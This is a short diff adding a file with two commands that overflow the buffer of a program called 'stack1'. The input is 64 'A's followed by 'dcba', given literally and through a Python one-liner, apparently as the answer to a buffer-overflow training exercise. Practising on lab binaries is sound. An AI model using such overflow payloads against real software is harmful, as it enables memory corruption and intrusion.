@@ -1,0 +1,3 @@
+./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
+
+./stack1 $(python -c "print ('A' * 64 + 'd' + 'c' + 'b' +'a')") 
